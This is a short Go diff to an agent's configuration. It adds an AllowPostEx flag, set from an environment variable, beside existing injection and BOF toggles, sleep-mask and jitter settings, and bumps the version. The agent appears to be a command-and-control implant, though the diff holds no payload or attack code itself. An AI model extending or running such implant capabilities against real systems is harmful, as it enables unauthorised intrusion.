@@ -28,8 +28,9 @@ type AgentConfig struct {
 	WSURL      string  `json:"ws_url"`
 	SleepMask  string  `json:"sleep_mask"`
 	AllowInject bool   `json:"allow_inject"`
-	AllowBOF   bool    `json:"allow_bof"`
-	Version    string  `json:"version"`
+	AllowBOF    bool   `json:"allow_bof"`
+	AllowPostEx bool   `json:"allow_postex"`
+	Version     string `json:"version"`
 }
 
 func defaultConfig() AgentConfig {
@@ -38,7 +39,7 @@ func defaultConfig() AgentConfig {
 		Jitter:    20,
 		Channel:   "http",
 		SleepMask: "jitter",
-		Version:   "3.0.0",
+		Version:   "3.1.0",
 	}
 }
 
@@ -115,6 +116,9 @@ func loadConfig() (AgentConfig, error) {
 	}
 	if os.Getenv("SC5_ALLOW_BOF") == "1" {
 		cfg.AllowBOF = true
+	}
+	if os.Getenv("SC5_ALLOW_POSTEX") == "1" {
+		cfg.AllowPostEx = true
 	}
 
 	if cfg.Channel == "" {
